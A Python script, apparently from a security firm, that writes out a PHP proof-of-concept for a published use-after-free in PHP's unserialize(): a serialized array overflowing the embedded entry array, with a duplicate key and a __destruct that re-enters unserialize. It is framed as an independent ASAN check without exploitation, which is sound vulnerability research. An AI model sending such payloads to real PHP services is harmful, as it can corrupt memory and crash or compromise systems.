# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""Independent check of the published "var_destroy re-entry UAF" claim (ACD421/PHP, zero4).

The mechanism, as published and as it reads in ext/standard/var_unserializer.re:

  1. php_unserialize_data carries an embedded var_entries (VAR_ENTRIES_MAX = 1018 zvals). Past that many
     pushes the entries are chained into a heap block.
  2. var_destroy frees the chained blocks first, so d->last points into freed memory.
  3. The destructor-slot walk that follows runs user code unbracketed, and
     php_var_unserialize_destroy frees the context only after that walk - so a __destruct that calls
     unserialize() again takes the "reuse" branch and pushes into the dying context,
     writing through d->last into the freed block.

So the payload needs two things: more pushes than the embedded array holds, and an object that ends up in
a destructor slot. The published trick for the second part is a duplicate key: the first occurrence's
object is moved into a var_dtor slot while the second occurrence takes the array value.

Nothing here is a weapon - it is the smallest script that makes the memory error visible under ASAN, with
no exploitation of it.

usage: php -d zend.assertions=1 vd_reentry.php [offset]
"""
import sys


def build(object_marker: str = "Reentry") -> str:
    """A serialized array with > 1018 pushes and one object in a destructor slot."""
    parts = []
    for key in range(1018):
        parts.append("i:%d;i:1;" % key)          # 1018 elements = 2036 pushes
    parts.append('i:1018;O:%d:"%s":0:{}' % (len(object_marker), object_marker))   # the object ...
    parts.append("i:1018;i:5;")                   # ... and a duplicate key that moves it into a dtor slot
    return "a:1020:{" + "".join(parts) + "}"


PHP = r'''<?php
class Reentry {
    public function __destruct() {
        // Runs while the outer unserialize() context is being destroyed. If the published mechanism
        // holds, this call reuses that dying context and pushes into memory that was already freed.
        @unserialize('i:7;');
    }
}

$payload = '%PAYLOAD%';
echo "payload: ", strlen($payload), " bytes\n";
$result = unserialize($payload);
echo "outer returned: ", var_export($result !== false, true), "\n";
echo "SURVIVED\n";
'''


def main() -> int:
    payload = build().replace("'", "\\'")
    script = PHP.replace("%PAYLOAD%", payload)
    out = "vd_reentry_generated.php"
    with open(out, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(script)
    print("wrote %s (%d bytes of payload)" % (out, len(build())))
    return 0


if __name__ == "__main__":
    sys.exit(main())
